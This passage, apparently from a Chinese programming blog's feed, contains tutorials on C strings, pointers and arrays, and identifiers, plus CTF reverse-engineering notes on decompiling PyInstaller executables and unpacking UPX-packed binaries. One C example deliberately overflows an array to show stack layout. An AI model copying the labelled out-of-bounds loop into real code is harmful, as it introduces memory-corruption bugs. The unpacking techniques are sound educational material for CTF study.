class="string">&quot;%c%c%c&quot;</span>, <span class="number">-28</span>, <span class="number">-67</span>, <span class="number">-96</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028153807346.png" alt="image-20231028153807346" style="zoom:50%;" /><p>这3个字符组合起来就是一个完整的<code>'你'</code>,当然,这样写仅仅是作为一个示例而已.</p><br><p>掌握了如何使用字符串,我们就可以编写出更加人性化的程序,为用户提供更多的提示信息;不仅如此,我们还为编写字符处理程序打下了基础.</p><p align=right>---WAHAHA</p><br><br><p>上一篇:<a href="../2023b7fda0df05ff">C语言教程-10-数组</a></p><p>下一篇:<a href="../202382eafac4349b">C语言教程-12_1-初识函数</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python逆向</title>
      <link href="/20233bd922fcbb74/"/>
      <url>/20233bd922fcbb74/</url>
      
        <content type="html"><![CDATA[<h1 id="打包处理">打包处理</h1><h2 id="pyinstaller打包">pyinstaller打包</h2><h2 id="例题-羊城杯-2020-login">例题-<a href="https://www.ctfer.vip/problem/1417">[羊城杯 2020]login</a></h2><p>DIE发现有Pyinstaller的打包</p><p>Github下载<code>pyinstxtractor.py</code>,然后直接使用下面的命令解包题目的login.exe即可(无加密)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004165414348.png" alt="image-20231004165414348"></p><p>源文件在这里:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004165432753.png" alt="image-20231004165432753" style="zoom:40%;" /><p>打开分析,使用z3进行解密即可(注意有一些故意打乱).</p><h2 id="pyc反编译">pyc反编译</h2><p>可以使用在线反编译工具,或者使用<code>uncompyle6.exe</code>进行反编译(使用pip安装,貌似默认自带).</p><p>使用方法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6.exe -o output.py input.pyc</span><br></pre></td></tr></table></figure><h1 id="混淆手段">混淆手段</h1><h2 id="元组比较">元组比较</h2><p>python的元组可以比较,即将元组的元素逐个比较,对于空元组,由于没有元素,因此比较永远返回False.</p><h2 id="布尔值用于数值">布尔值用于数值</h2><p>True为1,False为0.</p><p>因此例如<code>True &gt;&gt; False</code>这样的右移操作等价于<code>1 &gt;&gt; 0</code>,结果为<code>1</code>.</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加壳技术</title>
      <link href="/202354ac25179ed3/"/>
      <url>/202354ac25179ed3/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是壳">什么是壳</h1><p>壳是一种概念上的东西,我们的程序如果直接运行,可能会面临各种问题,例如我们需要防止程序被简单地反编译甚至被篡改.壳最初就是用于实现保护的这样的一种特殊程序.</p><p>相当于在我们原本的程序外加了一个特殊的壳程序,来保护我们原本的程序,壳在后面的发展中功能逐渐变化,也就出现了不同种类的壳.</p><p>大致有压缩壳,加密壳,VM壳的分类.</p><p>压缩壳主要用于较小软件的大小;加密壳用于保护软件,例如对数据/代码进行加密,以防止简单的静态分析破解等;VM壳利用了虚拟机技术,可以有效保护代码,但是牺牲了效率,所以往往出现在关键代码部分.</p><p>CTF中,可以使用DIE(Detect It Eazy)等软件对二进制程序进行检测,一般可以查出是否加壳.</p><h1 id="压缩壳">压缩壳</h1><p>压缩壳的侧重点就是减小软件体积大小,加密保护并不是其重点.</p><p>常见的压缩壳有UPX,aspack,fsg,Aspack Scrambler,ExeStealth, n Protector,V2Packer,WWPack32,XComp0.98, BeRoEXEPacker,dePACK,ExeShield Protector,KByS,NsPacK,tElock, Nspack PECompect Petite winUpack</p><h2 id="upx">UPX</h2><h3 id="加壳">加壳</h3><p>该项目开源,并且几乎不带有任何反调试或保护策略.</p><p>可以在UPX官网下载UPX程序进行加壳/脱壳.</p><p>官网:</p><p><a href="https://upx.github.io/">https://upx.github.io/</a></p><p>使用方法:</p><p><code>upx [-命令] [-选项] [-o 目标文件] 源文件..</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">whh@whh-virtual-machine:~/do$ ./upx</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2023</span><br><span class="line">UPX 4.2.0       Markus Oberhumer, Laszlo Molnar &amp; John Reiser    Aug 8th 2023</span><br><span class="line"></span><br><span class="line">Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file..</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  -1     compress faster                   -9    compress better</span><br><span class="line">  -d     decompress                        -l    list compressed file</span><br><span class="line">  -t     test compressed file              -V    display version number</span><br><span class="line">  -h     give more help                    -L    display software license</span><br><span class="line">Options:</span><br><span class="line">  -q     be quiet                          -v    be verbose</span><br><span class="line">  -oFILE write output to &#x27;FILE&#x27;</span><br><span class="line">  -f     force compression of suspicious files</span><br><span class="line">  -k     keep backup files</span><br><span class="line">file..   executables to (de)compress</span><br><span class="line"></span><br><span class="line">Type &#x27;upx --help&#x27; for more detailed help.</span><br><span class="line"></span><br><span class="line">UPX comes with ABSOLUTELY NO WARRANTY; for details visit https://upx.github.io</span><br></pre></td></tr></table></figure><h3 id="脱壳">脱壳</h3><h4 id="静态脱壳">静态脱壳:</h4><p>UPX本身提供脱壳器,使用参数-d即可脱壳.</p><p>但是UPX是基于加壳后可执行文件内存储的标识来查找并操作的,由于UPX开源,任何人可以修改这些标识,所以会导致官方的UPX脱壳失败,此时需要手动脱壳.</p><h4 id="动态脱壳">动态脱壳:</h4><p>可执行文件被操作系统载入后,寄存器中会放一些操作系统预先填充好的值,栈数据也会被设置,壳程序需要保留这些程序(状态),以免被壳段代码不经意间破坏.</p><p>一般,由于栈中原来的数据不应被更改,简单的壳程序一般将其压栈,x86的<code>pushad指令</code>就可以将所有的寄存器一次性压栈,UPX也是这样,称为<code>保护现场</code>.载入程序可以发现最开始为<code>pushad</code>,就可以执行该指令后再设置硬件断点,中断到一个长跳转后继续单步执行,找到原程序的入口(<code>OEP</code>,即原始入口点),然后Dump出来即还原.</p><p>或者如果没有发现pushad,则单步执行,单步执行为了防止跳过OEP,然后跳过UPX壳程序的循环代码,直到找到OEP,此时同样Dump即可.</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针和数组的关系</title>
      <link href="/2023697284686813/"/>
      <url>/2023697284686813/</url>
      
        <content type="html"><![CDATA[<h1 id="数组的本质">数组的本质</h1><p>在C/C++中,数组就是相同类型变量的有序集合,数组在一段连续的内存空间中存储他们—也就是数组的元素.</p><p>这段内存空间既可以在栈区,也可以在堆区,甚至可以在静态存储区.</p><p>不管在哪里分配,总之我们只需要知道这个数组的<code>首地址</code>和数组的<code>长度</code>,还有这个数组的<code>元素大小</code>,就可以确定这个数组.总之,我们就是为了能够统一存储一系列同类型的值.</p><h1 id="指针的本质">指针的本质</h1><p>指针的本质就是地址,而这个地址就是一个值,我们为了方便,一般将其以<code>16进制</code>进行显示.</p><p>C/C++中的指针的用途就是用来标识一个<code>数据对象</code>.一个数据对象有着他自己的长度(占用多少字节),指向这个数据对象的指针的类型就可以用于标识其长度.当然,还可以限定关于他的运算.</p><h1 id="指针和地址">指针和地址</h1><p>常常有人在争论:“指针不是地址,因为指针有类型”.</p><p>这句话可以说没有什么问题,但是他限定了讨论范围仅仅在C/C++语言中的指针.</p><p>如果在汇编中单独描述一个指针(例如栈基指针,栈顶指针),他们并没有任何的类型,毕竟汇编语言根本没有类型.汇编需要做的仅仅是根据寄存器中存有的地址值去定位内存而已.</p><p>但是在C/C++中情况就变得不同了.高级语言与低级语言最大的不同之一就是引入了<code>数据类型</code>,对于一块特定大小的内存,我们不再认为他们仅仅是几字节的二进制数据,取而代之的是,我们对这块内存设定一个类型,让我们能够以这种类型来进行对应的,针对性的操作,而不是再一视同仁.</p><p>类型的引入不仅仅帮助我们指定了运算,并且更重要的是,它规定了大小.例如x86的int占用4字节,double占用8字节.这让我们在处理数据的时候,不再需要像以前那样按照一个字节/一个字/2个字等等的去处理,而是直接根据需要的类型,去自动选择需要的宽度.</p><p>那么C/C++中的指针为了&quot;适应&quot;这种变化,自然不能够仅仅地去指定一个值去表示一个地址,相应地,<code>它必须有一个类型</code>,用于确认以这个地址为起始,究竟有多长的内存空间被视为一个数据对象进行处理.</p><p>换句话说,<code>C语言的指针是内存地址的一种高级抽象</code>.</p><p>所以,关于&quot;指针不是地址&quot;这个说法,要对半地去看,你怎么说都是可以的,因为各有各的道理,总之要结合起来去思考.</p><h1 id="指针和数组">指针和数组</h1><p>指针和数组存在着很复杂的关系,不仅仅包含下面讨论的这一点知识.</p><h2 id="数组指针">数组指针</h2><p>同理,既然C中指针能指向一般的内置类型,那么自定义的类型(例如数组)当然也应该可以指向,这就引入了数组指针,同理,声明一个指针数组也要写清楚具体的长度,这里实际上就是可以指向的数组的长度.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">10</span>]=&amp;arr; <span class="comment">//p是一个数组指针,被初始化为指向arr这个数组 </span></span><br></pre></td></tr></table></figure><h2 id="指针数组">指针数组</h2><p>指针数组实际上并没有什么单独拿出来的必要,因为指针变量(保存指针的变量)也是变量,只不过用来存储的值特殊了点而已.</p><p>那么,指针数组自然就是用来存储一系列的指针的数组了,没什么好说的.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* arr[<span class="number">10</span>]; <span class="comment">// arr为指针数组，数组中的元素都是指针</span></span><br></pre></td></tr></table></figure><h2 id="数组的首地址">数组的首地址</h2><p>实际上这个概念是比较模糊的,本人在这里给出一个逻辑:</p><p><code>数组的首地址</code>的类型是<code>指向这个数组的指针</code>,也就是说,对这个类型的地址加1,结果是加了这个数组的长度.</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">10</span>] = &amp;a;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)(p + <span class="number">1</span>) - (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llu&quot;</span>, value);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序输出的结果是40,也就是sizeof(a)的值.</p><p>其中,p中保存的就是数组的首地址,如果把初始化的值<code>&amp;a</code>改为<code>a</code>,那么编译器会报一个警告(C语言中)甚至是报错(C++中).</p><p>而<code>数组首元素的地址</code>的类型就是<code>指向数组元素类型的指针</code>,我们看例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p = &amp;a[<span class="number">0</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)(p + <span class="number">1</span>) - (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llu&quot;</span>, value);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序输出的结果是4,也就是sizeof(a[0])的值.</p><p>其中,p中保存的就是数组首元素的地址,如果把初始化的值<code>&amp;a[0]</code>改为<code>a</code>,那么编译器会报一个警告(C语言中)甚至是报错(C++中).</p><p>我们注意到,第一个程序中,如果把给p的初始值从<code>&amp;a</code>换成<code>a</code>,那么就会发生类型不匹配的问题.这里说的是C语言中数组标识符作为表达式时的一个特性:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001035338186.png" alt="image-20231001035338186"></p><p>实际上,在C/C++语言中,单独的数组名(也就是这个数组的标识符)作为<code>表达式</code>,其类型为<code>指向数组元素的指针</code>,而值和<code>数组的首地址</code>相等.所以,上图报错(C++中)称不能在初始化中将’int*'类型转换为’int (*)[10]'类型.</p><p>进一步,我们如果有<code>int a[10];</code>那么<code>a+1</code>实际上是一个指针运算,<code>a+1</code>的值显然,是a向后偏移了4个字节—也就是<code>sizeof(int)*1</code>,更准确的说,这里应该是<code>sizeof(*a) * 4</code>.</p><p>再例如我们有<code>int a[10];</code>和<code>int offset=3;</code>那么<code>a+offset</code>相对于a的值向后偏移了如下字节数:</p><p><code>sizeof(*a) * offset</code></p><h1 id="指针和数组是否等价">指针和数组是否等价</h1><h2 id="数组就是指针">数组就是指针?</h2><p>说实话,在写这篇短文的时候,我也比较纠结,但是经过了不短时间的学习,并且恰巧看了《C++20高级编程》中相关的描述,我还是认为&quot;数组就是指针&quot;这句话一定程度上是对的.</p><h3 id="一段有问题的代码">一段有问题的代码</h3><p>我们首先来看一段代码,这段代码实际上是有问题的,但是他没有报错!我们就是要说明这个问题:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> int_before_a = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; ++i)</span><br><span class="line">a[i] = i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, int_before_a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序在Win11下使用gcc12.2编译成功为x64程序,运行结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001161610190.png" alt="image-20231001161610190" style="zoom:50%;" /><p>显然,程序中的第一个循环发生了溢出,实际上a只有0-9这个10个下标的元素,但是我们错误地对a[10]这个不存在的元素进行了赋值,然后会发现前面的int_before_a被覆盖了,也就是说,这里的所谓a[10]正是int_before_a.</p><p>有人可能会疑惑,明明int_before_a的声明位置在a的前面,为什么对a的访问&quot;向后&quot;溢出了,却能访问到前面的int_before_a?</p><p>实际上,在gcc实现中,函数内的各个局部变量默认从上向下依次压栈连续存储,我们又知道,栈从高地址向低地址开辟空间,也就是说,rbp(栈基寄存器)指向的函数栈帧的栈底在相对高地址处,而rsp(栈顶寄存器)指向的栈顶在低地址,每次rsp减小时,都意味着&quot;压入&quot;一个变量或寄存器的值等.</p><p>那么,首先从栈帧的高地址处先压入int_before_a这个局部变量,然后再继续压入a这个数组;而且,a的首元素是在靠近栈顶的一段;a的尾元素,也就是a[9],在靠近栈底的位置,就这个程序而言,a[9]的下面(指栈的底部)紧挨着就是int_before_a.</p><p>使用IDA反编译出来伪代码的结果如下:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001162737882.png" alt="image-20231001162737882" style="zoom:45%;" /></p><p>再来看一下main函数的栈帧结果如下:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001162948884.png" alt="image-20231001162948884" style="zoom:45%;" /></p><p>实际上,<code>a[i]</code>和<code>*(a+i)</code>完全等价,底层上,对数组进行下标运算确实是这样实现的,那么我们就可以理解,a[10]就被解释为<code>*(a+10)</code>,那么<code>a+10</code>作为一个指针值,当然比<code>a+9</code>要大,意味着它指向更高的地址,这里实际上就恰好指到了int_before_a这个变量的位置,然后我们对其进行赋值,就发生了溢出.</p><h3 id="数组就是指针">数组就是指针</h3><p>从语法层面,我们声明一个数组当然和声明一个指针<code>完全</code>不同,但是一旦编译器处理完毕,数组的各种行为就和指针一模一样,例如,下标运算被转换为对应等价的指针运算.</p><p><strong>事实上</strong>,无论是C还是C++,数组都没有包含任何的大小信息(数组的长度)!这也是我们在C++中更推荐使用<code>现代容器</code>的一个原因!</p><p>如果数组能够相对于指针多出长度的信息,那么显然上面的溢出就没有那么容易出现.但是很遗憾,数组的下标运算被完全转换为指针运算,那么这时候,C编译器没有义务为你去检查你的操作是否合理,你至多只会收到段错误的异常而已.</p><p>如果你使用一些智能的IDE,你可能会反驳:我的软件明明给我提出了警告啊?</p><p>要知道,这是软件提供的智能服务,并不是C编译器自己的行为,软件可以找到可能潜在的问题,但是没有权利对这些问题进行绝对的禁止!只有真正的编译器才有权利去决定你的代码最终是否合法.</p><p>总而言之,所谓的&quot;数组就是指针&quot;,指的是C语言数组的行为实际和对应的指针运算完全等价.</p><h2 id="指针就是数组">指针就是数组?</h2><p>很显然,这句话是错误的!</p><h3 id="什么时候指针等价于数组">什么时候指针等价于数组</h3><p>只有当某个指针变量指向了某一块可以使用的,被分配好的,用于作为数组存储一系列值的数据块时,这个指针才和数组是等价的.</p><p>因为和一般的数组名作为标识符一样,它也特定标识了一段内存空间,我们便可以用这个指针变量进行数组访问.我们甚至可以对这个指针变量使用<code>数组下标运算符</code>!</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p = a;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">a[i] = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在后面的代码中直接将p视作一个数组的标识来进行使用.当然,你仍然可以这样使用它:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p = a;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">a[i] = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *(p+i));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="什么时候指针不等价于数组">什么时候指针不等价于数组</h3><p>当指针仅仅指向了一个单一的变量(数据对象)时,它仅仅表现出一个普通的指针该有的行为,而我们若把它视作一个数组—那么显然很可能会出现像上面的溢出那样的问题.</p><p>当然,如果我们有下面的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n=<span class="number">3</span>;</span><br><span class="line"><span class="type">int</span> *p=&amp;n;</span><br></pre></td></tr></table></figure><p>那么我们使用p来访问n,可以使用*p来完成,而且p[0]也是合法的,只是这种写法体现出来的风格十分可疑,并且没有带来任何的好处!</p><h1 id="如何正确使用指针">如何正确使用指针</h1><p>另外我认为,使用指针的一个非常重要的思维就是,一定要搞清楚当前这个指针的类型,指针的行为与其类型息息相关.</p><p>例如很多人可能有一种错觉,就是在学习二维数组和指针的关系时,认为<code>二级指针---例如int **</code>和<code>一维数组指针---例如int (*)[10]</code>是一样的,毕竟他们都是在一维指针的基础上更上了一层,但实际上,<code>二者的差别很大</code>,如果你在学习阶段做了足够多的尝试和试错,你应该会有更加深刻的体会.</p><p>​—WAHAHA 2023.10.1</p>]]></content>
      
      
      <categories>
          
          <category> 琐碎想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-1_2-关键概念</title>
      <link href="/20238697253e6493/"/>
      <url>/20238697253e6493/</url>
      
        <content type="html"><![CDATA[<p>PS:本文章参考自C primer plus.</p><h1 id="编程机制">编程机制</h1><p>生成程序的具体过程根据语言和操作系统的不同.C语言是可移植性语言,可以在多种不同的环境下使用,包括UNIX,Linux,MS-DOS,Windows,Macintosh OS.本系列文章基本只关心不同环境所共有的部分,至于一些不同环境的不同处理,会特别指出.</p><p>事实上,就学习C语言而言,我们无需理会编程机制,但是了解一下这方面的知识,对于学习/理解C程序有着莫大的帮助.</p><p>用C编写程序时,我们手动直接编写的代码,大部分系统中都要求在.c为后缀名的文件中,它仍然是纯文本(和.txt的唯一区别就是后缀名).至于对文件名的要求,不同操作系统各不相同,例如MS-DOS过于老旧,它要求文件的基本名不能超过8个字符.</p><h2 id="目标代码文件-可执行文件和库">目标代码文件,可执行文件和库</h2><p>作为初学,我们仅仅需要关心源代码,并将其编译为可执行文件即可,但是事实上,C程序的生成没有那么简单.C程序在生成过程中会有许多中间文件的生成,这里简单讲解一下最基本的过程.</p><p>首先,C编译器要将源代码转换为机器语言代码,存放在<code>目标代码文件</code>,这个文件已经是二进制的了,但是并不能在操作系统上直接运行,因为它还缺少<code>启动代码</code>等信息.</p><p><code>目标代码文件</code>缺少<code>启动代码</code>,有了对应操作系统特定的启动代码,目标代码才能被正常地处理运行.</p><p>除此之外,<code>目标代码文件</code>还缺少库函数,几乎所有的C程序都需要使用到C标准库中的函数,例如printf()函数的使用等,这些函数是C语言标准库已经写好的,我们只需要将他们包含进去即可,这些信息都存放在相应的<code>库</code>文件中,<code>库</code>中包含有许多函数的<code>目标代码</code>.</p><p>接下来就需要进行<code>链接</code>操作,链接器的作用是,将你编写的目标代码和库代码,系统的标准启动代码整合到一起,最终生成的二进制文件才是我们能够运行的程序.</p><h1 id="c代码的基本要素">C代码的基本要素</h1><p>我们在上一篇文章已经讲解了一个完整的C程序的各个组成部分了,这里要进一步进行描述.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p align=right&gt;---WAHAHA，<span class="number">2023.9</span><span class="number">.19</span>&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>我们可以看到,在C代码中,有着各式各样的字符,不仅有标点符号,还有数字,字母,他们的排列构成各个<code>标识符</code>,<code>指令</code>,<code>数据</code>等等.对于这些内容,有着一些最基本的规范.</p><h2 id="字符集">字符集</h2><p>C语言基于英文字符进行编写,正常来说,我们所有需要使用到的字符,都可以在我们日常使用到的键盘上找到(不使用任何输入法),也就是说,无论是我们拼写的变量名,还是各个指令,亦或是运算符,都需要使用英文字符去组成,而我们的中文字符,中文汉字,或者是其他国家的各种字符,从规范的角度,都不应该出现(字符串除外).</p><p>因此必须要注意的是,对于变量名等<code>标识符</code>,我们应该只使用英文字母(和其他C语言允许的英文字符)进行构成;</p><p>对于运算符等符号,我们只能使用英文的标点符号,而且不同于<code>标识符</code>,这里是硬性要求,绝对不能使用除英文字符以外的字符—除非你想在你的程序里翻来覆去半天看不出问题.</p><p>所以,在编写程序时,为了您和电脑的健康和安全,请务必关闭中文输入法!(除非你要输入一个中文的字符串)</p><h2 id="标识符的命名规范">标识符的命名规范</h2><p>我们来看一下标准中对<code>标识符</code>的定义:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001003151232.png" alt="image-20231001003151232" style="zoom:33%;" /><p>说人话就是,各种我们能自己命名的玩意都是标识符.doge~</p><p>其中就包括变量名,函数名等.</p><p>关于<code>标识符</code>的命名方式,有一些要求:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> 标识符必须以字母a-z、 A-Z或下划线开头，后面可跟任意个(可为<span class="number">0</span>)字符，这些字符可以是字母、下划线和数字，其他字符不允许出现在标识符中</span><br><span class="line"><span class="number">2</span> 标识符严格区分大小写字母</span><br><span class="line"><span class="number">3</span> 标识符的长度，c89规定<span class="number">31</span>个字符以内，c99规定<span class="number">63</span>个字符以内(没有哪个疯子超出这个范围吧...)</span><br><span class="line"><span class="number">4</span> C语言中的关键字，有特殊意义，不能作为标识符(例如<span class="keyword">if</span>,<span class="keyword">for</span>,<span class="keyword">while</span>,<span class="keyword">goto</span>,<span class="keyword">return</span>等)</span><br><span class="line"><span class="number">5</span> 自定义标识符最好取具有一定意义的字符串，便于记忆和理解</span><br><span class="line"><span class="number">6</span> 不同平台最好遵循各自的命名规范,例如Windows一般使用驼峰命名法,Linux使用下划线命名法</span><br></pre></td></tr></table></figure><p>这里说的<code>关键字</code>,在下面说明.</p><h2 id="关键字和保留的标识符">关键字和保留的标识符</h2><h3 id="关键字">关键字</h3><p>关键字就是构成C语言的关键词,由它们构成C的语法体系,所以,这些词语是不能够被使用做标识符名称的.</p><p>具体见:<a href="https://zh.cppreference.com/w/c/keyword">https://zh.cppreference.com/w/c/keyword</a></p><p>主要的是这些:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001003820548.png" alt="image-20231001003820548" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231001003835758.png" alt="image-20231001003835758" style="zoom:50%;" 